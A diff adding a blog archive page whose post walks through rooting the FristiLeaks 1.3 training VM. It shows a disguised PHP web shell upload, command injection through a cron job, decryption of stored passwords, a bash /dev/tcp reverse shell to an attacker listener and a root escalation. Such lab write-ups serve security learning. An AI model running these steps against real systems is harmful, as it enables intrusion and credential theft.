@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]--><!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]--><!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]--><!--[if !(IE 6) & !(IE 7) & !(IE 8)]><!--><html lang="en-US">
+<!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>
+Development | Graeme Robinson&#039;s blog	</title>
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="stylesheet" type="text/css" media="all" href="/wp-content/themes/twentyelevenmod/style.css?ver=20240716">
+<link rel="pingback" href="/xmlrpc.php">
+<!--[if lt IE 9]>
+<script src="/wp-content/themes/twentyeleven/js/html5.js?ver=3.7.0" type="text/javascript"></script>
+<![endif]-->
+<meta name="robots" content="max-image-preview:large">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Comments Feed" href="/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Development Category Feed" href="/category/development/feed/">
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🐦‍⬛","🐦​⬛")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<link rel="stylesheet" id="wp-block-library-css" href="/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2" type="text/css" media="all">
+<style id="wp-block-library-theme-inline-css" type="text/css">.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}</style>
+<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--blue: #1982d1;--wp--preset--color--dark-gray: #373737;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #e2e2e2;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="wp-syntax-css-css" href="/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="twentyeleven-block-style-css" href="/wp-content/themes/twentyeleven/blocks.css?ver=20240621" type="text/css" media="all">
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="/wp-json/">
+<link rel="alternate" title="JSON" type="application/json" href="/wp-json/wp/v2/categories/48">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.6.2">
+	<style>/* Link color */
+		a,
+		#site-title a:focus,
+		#site-title a:hover,
+		#site-title a:active,
+		.entry-title a:hover,
+		.entry-title a:focus,
+		.entry-title a:active,
+		.widget_twentyeleven_ephemera .comments-link a:hover,
+		section.recent-posts .other-recent-posts a[rel="bookmark"]:hover,
+		section.recent-posts .other-recent-posts .comments-link a:hover,
+		.format-image footer.entry-meta a:hover,
+		#site-generator a:hover {
+			color: #ff7600;
+		}
+		section.recent-posts .other-recent-posts .comments-link a:hover {
+			border-color: #ff7600;
+		}
+		article.feature-image.small .entry-summary p a:hover,
+		.entry-header .comments-link a:hover,
+		.entry-header .comments-link a:focus,
+		.entry-header .comments-link a:active,
+		.feature-slider a.active {
+			background-color: #ff7600;
+		}</style>
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style type="text/css" id="custom-background-css">body.custom-background { background-color: #f1f1f1; }</style>
+	</head>
+
+<body class="archive category category-development category-48 custom-background wp-embed-responsive single-author two-column right-sidebar">
+<div class="skip-link"><a class="assistive-text" href="#content">Skip to primary content</a></div>
+<div class="skip-link"><a class="assistive-text" href="#secondary">Skip to secondary content</a></div>
+<div id="page" class="hfeed">
+	<header id="branding">
+			<hgroup>
+				<h1 id="site-title"><span><a href="/" rel="home">Graeme Robinson&#039;s blog</a></span></h1>
+				<h2 id="site-description">A place for my thoughts when I was starting to break into the information security feild</h2>
+			</hgroup>
+
+						<a href="/">
+				<img src="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg" width="1000" height="228" alt="Graeme Robinson&#039;s blog" srcset="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg 1000w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-300x68.jpg 300w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-500x114.jpg 500w" sizes="(max-width: 1000px) 100vw, 1000px" decoding="async" fetchpriority="high">			</a>
+			
+									<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+			
+			<nav id="access">
+				<h3 class="assistive-text">Main menu</h3>
+				<div class="menu"><ul>
+<li><a href="/">Home</a></li>
+<li class="page_item page-item-2"><a href="/about-me/">About Me</a></li>
+<li class="page_item page-item-13"><a href="/infosec-links/">InfoSec Links</a></li>
+</ul></div>
+			</nav><!-- #access -->
+	</header><!-- #branding -->
+
+
+	<div id="main">
+
+		<section id="primary">
+			<div id="content" role="main">
+
+			
+				<header class="page-header">
+					<h1 class="page-title">
+					Category Archives: <span>Development</span>					</h1>
+
+									</header>
+
+				
+				
+					
+	<article id="post-321" class="post-321 post type-post status-publish format-standard hentry category-compromise category-infosec category-linux category-passwords category-pentest category-php category-python category-shell category-unix category-web-server">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/fristileaks-1-3/" rel="bookmark">FristiLeaks 1.3</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/fristileaks-1-3/" title="11:29 AM" rel="bookmark"><time class="entry-date" datetime="2017-10-22T11:29:27+00:00">2017-10-22</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/fristileaks-1-3/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Following on from <a href="/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
+<p>So the first thing I did after turning the VM on was notice in the console that it displays it&#8217;s IP address so there is no need to run netdiscover. So lets start with nmap:</p>
+<pre>root@kali:~# nmap -A [IP-REDACTED]
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-21 14:02 EDT
+Nmap scan report for [IP-REDACTED]
+Host is up (0.00035s latency).
+Not shown: 999 filtered ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_ Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.35 ms [IP-REDACTED]
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds</pre>
+<p>Interesting results; port 80 is the only open port, and unsurprisingly it&#8217;s running a web server on that port. nmap has handily checked for a robots.txt on that system and found 3 directories listed (cola, sis, beer). Time to fire up a web browser and take a look.</p>
+<p>The index page is not that interesting, but in the source, it does suggest that I should be able to get root within four hours. It took me at least twice that! The three directories mentioned earlier all appear to server the same page with a single meme on suggesting I&#8217;m in the wrong place. Interestingly, the image is served from an &#8220;images&#8221; directory and when I go there, I am given a listing of the directory which appears to contain only this meme and the image used in the index page.</p>
+<p>At this point, I didn&#8217;t really know what I was supposed to do, but I tried going to the &#8220;fristi&#8221; directory and got lucky, because I was presented with an admin login page. If I hadn&#8217;t been so lucky, I would have used dirb, so I did this later with standard wordlists and it didn&#8217;t find anything. I then created a text file with all the words from both pages and both images and it then found the page.</p>
+<p>This admin page requires a username and password, and I don&#8217;t have either, though I could guess at passwords, and I did try things like &#8220;Nelson&#8221; (the Simpsons character in the image), but didn&#8217;t get anywhere. The source of the page has a comment from someone who calls themselves &#8220;eezeepz&#8221;. There is also a comment in the meta description that says that images are base64 encoded, and they&#8217;re right. The image of Nelson is base64 encoded, and there is also a comment below it that is base64 encoded data. That comment happens to be a base64 encoded png, the content of which is the letters &#8220;keKkeKKeKKeKkEkkEk&#8221; in comic-sans font. That looks like a password, and combined with the username &#8220;eezeepz&#8221;, I am able to log in.</p>
+<p>The page I am taken to after I log in is one where I can apparently upload a file. We know this web server runs php, so it makes sense to try to upload a php script, but when we try that it tells us that we can only upload png, jpg and gif files. I assume this is enforced by file extension rather than validating the content of the file. Most web servers will only execute files ending in .php, but a common misconfiguration is to make them execute files with .php anywhere in the name, so I called my file backdoor.php.png so I tried uploading my one line php shell with a png extension, which it appeared to accept and told me it had been placed in /uploads. Sure enough directing my web browser to http://[IP-REDACTED]/fristi/uploads/backdoor.php.png?e=whoami told me that I was able to execute commands as the user called apache.</p>
+<p>Viewing the /etc/passwd file showed me that there were some other users that look interesting (root, ezeepz, admin, fristi &amp; fristigod). and looking in the /var/www directory showed a notes.txt file that has a message from &#8220;jerry&#8221; to eezeepz telling them to clean their home directory, but not to &#8220;delete the important stuff&#8221;. I also noticed that I can list the contents of /home/eezeepz. In /home/eezeepz there is another notes.txt, this one is another message from &#8220;jerry&#8221; basically telling me how to run a select few commands under his account (admin). The message says to put commands in a file called /tmp/runthis and those commands will be run every minute with the results written to /tmp/cronresult.</p>
+<p>This command in my backdoor should tell me what is in the admin account</p>
+<pre>echo "ls ~" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>but unfortunately it only tells me that my command has to start with /home/admin or usr/bin. neither of these contain ls, but /home/admin contains grep, so I can try this:</p>
+<pre>echo "/home/admin/grep -c . ~/*" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>which should tell me which files are in admin&#8217;s home folder, and it does. Files of interest are cronjob.py, cryptedpass.txt cryptpass.py whoisyourgodnow.txt. I should be able to get the contents of cronjob.py by doing:</p>
+<pre>echo "/home/admin/grep . *.py *.txt" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>The output from this shows me how the cronjob works. It looks like (due to a bug) it checks for &#8216;|&amp;;&#8217; instead of &#8216;|&#8217; <strong>or</strong> &#8216;&amp;&#8217; <strong>or</strong> &#8216;;&#8217; (they should probably have used the &#8220;any()&#8221; builtin) so I can get away with running any command as admin, as long as I prefix it with /home/admin/, (e.g. &#8220;/home/admin/echo a; ls ~&#8221; to list the content of /home/admin) and it also shows me two poorly &#8220;encrypted&#8221; passwords and a python script that was used to &#8220;encrypt&#8221; them.</p>
+<p>I can decrypt these passwords by creating a simple python script to reverse the steps done by the cryptpass.py script:</p>
+<pre>#decrypt.py
+import base64, codecs, sys
+def decodeString(str):
+    base64string= codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(base64string)
+cryptoresult=decodeString(sys.argv[1])
+print cryptoresult</pre>
+<p>When I run this with the encrypted password, I get &#8220;thisisalsopw123&#8221; from cryptedpass.txt, and &#8220;LetThereBeFristi!&#8221; from whoisyourgodnow.txt.</p>
+<p>Running these commands as admin one at a time through web server then waiting for the cron job to run is a bit slow. It&#8217;s time to figure out how to get a reverse shell, then we should be able to switch users using the su command. I know that there is no nc or ncat or netcat on this system because I ran &#8220;which nc nectar cat&#8221; as apache and was told it doesn&#8217;t exist. Bash does though, and using redirection to and from bash&#8217;s builtin /dev/tcp, I can get similar results to using nc and bash</p>
+<p>I started a netcat listener enemy attacking machine using &#8220;nc -vnlp 4444&#8221; then using my backdoor.php.png, I ran &#8220;bash -i &gt;/dev/tcp/[IP-REDACTED]/4444 0&gt;&amp;1 2&gt;&amp;1&#8221;. I had to made sure to url encode this one before I requested it with my web browser for some reason because it wouldn&#8217;t work otherwise.</p>
+<p>So now I have a shell as apache, but when I try to &#8220;su admin&#8221; it tells me that &#8220;standard in must be a tty&#8221;, and I am still the apache user. Luckily, I found a one line command that works around this and gives me a tty that I can run su in:</p>
+<pre>python -c 'import pty; pyt.spawn("/bin/bash")'</pre>
+<p>and I can use the passwords I decrypted earlier for the admin and the fristigod accounts.</p>
+<p>There isn&#8217;t much of interest in /home/frisitigod, but that&#8217;s not frisitigod&#8217;s home directory. The home dir is /var/fristigod and inside there is a hidden folder called .secret_admin_stuffand it contains one executable file called doCom, owned by root and with the suid bit set. Unfortunately running it tells me that I&#8217;m the wrong user.</p>
+<p>I got stuck at this point and tried various things like running the program as apache and as  admin and running as root using sudo using all the accounts I have access to. I tried running strings against the file to figure out if I could see a username or id, but I wasn&#8217;t able to. Running strings did tell me that the usage is &#8220;./program_name terminal_command&#8221; though, so it looks like it&#8217;s a way of running any command as root (obviously terribly insecure).</p>
+<p>Eventually I noticed in fristigod&#8217;s .bash_history file there was evidence that this program had been run by fristigod as the first user (using sudo -u, which I had to read up on because I didn&#8217;t know that was a thing!). So the following command confirmed that I was able to run commands as root:</p>
+<pre>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id</pre>
+<p>running bash as root gives me a root shell. There is a txt file in /home/root that I can now read, which congratulates me and suggests that it should have taken me 4 hours (it took me much longer) and lastly has the flag.</p>
+<p>I really enjoyed this machine, especially as it didn&#8217;t have any known exploits to compile and or run. It was all just configuration mistakes and silly security mistakes. I also really enjoyed having to work around not being able to use nc on this system since it wasn&#8217;t present.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
